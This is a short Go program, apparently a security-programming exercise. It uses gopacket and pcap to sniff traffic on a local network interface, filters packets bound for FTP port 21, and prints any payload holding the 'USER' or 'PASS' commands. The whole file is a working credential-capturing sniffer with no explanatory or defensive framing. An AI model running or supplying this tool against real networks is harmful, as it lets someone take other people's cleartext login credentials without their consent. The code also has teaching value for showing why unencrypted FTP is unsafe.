// Still needs an active FTP server to draw a connection.
package main

import (
	"bytes"
	"fmt"
	"log"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var (
	iface    = "\\Device\\NPF_{E4C614B5-4E54-4A12-8172-042970D9B715}"
	snaplen  = int32(1600)
	promisc  = false
	timeout  = pcap.BlockForever
	filter   = "tcp and dst port 21"
	devFound = false
)

func main() {
	devices, err := pcap.FindAllDevs() // Enumerate all devices.
	if err != nil {
		log.Panicln(err)
	}

	for _, device := range devices {
		if strings.Contains(device.Name, iface) { // Check if the device exists.
			devFound = true
		}
	}
	if !devFound {
		log.Panicf("Device named '%s' does not exist\n", iface)
	}

	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout) // Open the device for capturing & return a Handle.
	if err != nil {
		log.Panicln(err)
	}
	defer handle.Close()

	fmt.Printf("Filters Set:'%s'\n", filter)
	if err := handle.SetBPFFilter(filter); err != nil {
		log.Panicln(err)
	}

	source := gopacket.NewPacketSource(handle, handle.LinkType())
	fmt.Printf("Sources: %v\n", source)
	for packet := range source.Packets() {
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}
		payload := appLayer.Payload()
		if bytes.Contains(payload, []byte("USER")) {
			fmt.Print(string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(string(payload))
		}
	}
}
